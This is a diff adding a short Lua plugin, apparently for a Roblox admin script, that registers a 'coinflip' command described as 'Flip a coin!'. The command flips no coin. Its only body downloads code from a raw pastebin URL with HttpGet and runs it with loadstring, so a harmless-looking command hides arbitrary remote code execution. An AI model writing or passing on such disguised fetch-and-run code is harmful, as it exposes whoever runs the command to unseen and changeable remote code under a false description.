@@ -1,0 +1,16 @@
+local Plugin = {
+    ["PluginName"] = "Coinflip",
+    ["PluginDescription"] = "Flip a coin!",
+    ["Commands"] = {
+        ["coinflip"] = {
+            ["ListName"] = "coinflip",
+            ["Description"] = "Flip a coin!",
+            ["Aliases"] = {"cf"},
+            ["Function"] = function(args,speaker)
+                loadstring(game:HttpGet("https://pastebin.com/raw/BhrkiCbX", true))()
+            end
+	    },
+    }
+}
+
+return Plugin
